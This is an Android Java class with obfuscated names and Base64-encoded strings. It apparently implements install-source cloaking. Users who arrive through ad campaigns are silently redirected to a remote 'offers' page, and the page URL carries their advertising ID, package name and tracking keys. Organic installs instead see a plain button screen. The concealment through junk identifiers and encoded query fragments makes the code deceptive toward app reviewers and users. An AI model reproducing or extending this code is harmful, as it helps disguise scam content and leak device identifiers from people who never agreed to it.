package com.isnndai.terreuas;

import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.util.Log;
import android.widget.Button;
import android.widget.ProgressBar;

import androidx.annotation.RequiresApi;
import androidx.room.Room;

import com.facebook.FacebookSdk;
import com.facebook.appevents.AppEventsLogger;
import com.facebook.applinks.AppLinkData;

public class Fase {

    String knds;
    String ojnne;
    private String lms;
    private String dfd;
    private String ljfd;
    private IT it;
    private ProgressBar progressBardadaqeqeol;
    private Button bSss,bPppp,bGpp,bCccc;
    public static Databaseddddd databaseddddd;
    public String jjjj;
    public int qqqq;

    public void setProgressBardadaqeqeol(ProgressBar progressBardadaqeqeol) {
        this.progressBardadaqeqeol = progressBardadaqeqeol;
    }

    public void setbSss(Button bSss) {
        this.bSss = bSss;
    }

    public void setbPppp(Button bPppp) {
        this.bPppp = bPppp;
    }

    public void setbGpp(Button bGpp) {
        this.bGpp = bGpp;
    }

    public void setbCccc(Button bCccc) {
        this.bCccc = bCccc;
    }

    public Fase(String url, String keyDefault, String fbId, IT it) {
        this.lms = url;
        this.dfd = keyDefault;
        this.ljfd = fbId;
        this.it = it;
    }

    public void fasss(){

        new Thread(new Runnable() {
            @Override
            public void run() {
                databaseddddd = Room.databaseBuilder(it.getApplicationContext(),
                        Databaseddddd.class, "iuskoj").build();

                try {
                    qqqq = databaseddddd.daoDdd().gethowMuchWeHaveDao();
                    jjjj = databaseddddd.daoDdd().getlastWeDao().cccc;

                }catch (Exception e){

                }
            }
        }).start();

        FacebookSdk.setApplicationId(ljfd);
        FacebookSdk.setAdvertiserIDCollectionEnabled(true);
        FacebookSdk.sdkInitialize(it.getApplicationContext());
        FacebookSdk.fullyInitialize();
        FacebookSdk.setAutoInitEnabled(true);
        FacebookSdk.setAutoLogAppEventsEnabled(true);

        AppEventsLogger.activateApp(it.getApplication());
        AppLinkData.fetchDeferredAppLinkData(it.getApplicationContext(),
                new AppLinkData.CompletionHandler() {
                    @RequiresApi(api = Build.VERSION_CODES.O)
                    @Override
                    public void onDeferredAppLinkDataFetched(AppLinkData appLinkData) {
                        if (appLinkData == null) {
                            appLinkData = AppLinkData.createFromActivity(it);
                        }
                        if (appLinkData != null) {
                            Uri url = appLinkData.getTargetUri();
                            knds = url.getQuery();
                            ojnne = Asas.prrr(knds,it.getPackageName(), Aa.ljdjA,Aa.kdnsd);

                        }else {

                        }
                    }

                }
        );

        if (qqqq>0){
            Intent intentds = new Intent(it.getApplicationContext(),Offerrrreews.class);
            intentds.putExtra("sdwq", jjjj);
            it.startActivity(intentds);
            it.finishAffinity();
        }else {
            new Handler().postDelayed(new Runnable() {
                @RequiresApi(api = Build.VERSION_CODES.O)
                @Override
                public void run() {

                    String ffsdf = Aa.kdns;
                    String kfd = null;
                    if (ffsdf.equals(Asas.ddedea("Tm9uLW9yZ2FuaWM="))){
                        kfd = lms + Aa.LJds;
                        Intent intentds = new Intent(it.getApplicationContext(),Offerrrreews.class);
                        intentds.putExtra("sdwq", kfd);
                        it.startActivity(intentds);
                        it.finishAffinity();

                    }else if(knds != null) {
                        kfd = lms + ojnne;
                        Intent intentds = new Intent(it.getApplicationContext(),Offerrrreews.class);
                        intentds.putExtra("sdwq", kfd);
                        Log.d("qqqq",kfd);
                        it.startActivity(intentds);
                        it.finishAffinity();

                    }else {
                        if (dfd.equals(Asas.ddedea("Tk8="))) {
                            Aa.hdsk(progressBardadaqeqeol,bSss,bPppp,bGpp,bCccc,it);
                        }else {
                            String strAppsFlyer = dfd + Asas.ddedea("P2J1bmRsZT0=") + it.getPackageName() + Asas.ddedea("JmFkX2lkPQ==") +
                                    Aa.ljdjA + Asas.ddedea("JmFwcHNfaWQ9") + Aa.kdnsd + Asas.ddedea("JmRldl9rZXk9") + Asas.ddedea(Aa.Khdjs);
                            kfd = lms + strAppsFlyer;
                            Log.d("qqqq",kfd);
                            Intent intentds = new Intent(it.getApplicationContext(),Offerrrreews.class);
                            intentds.putExtra("sdwq", kfd);
                            it.startActivity(intentds);
                            it.finishAffinity();

                        }
                    }

                }

            },5000);

        }

    }
}
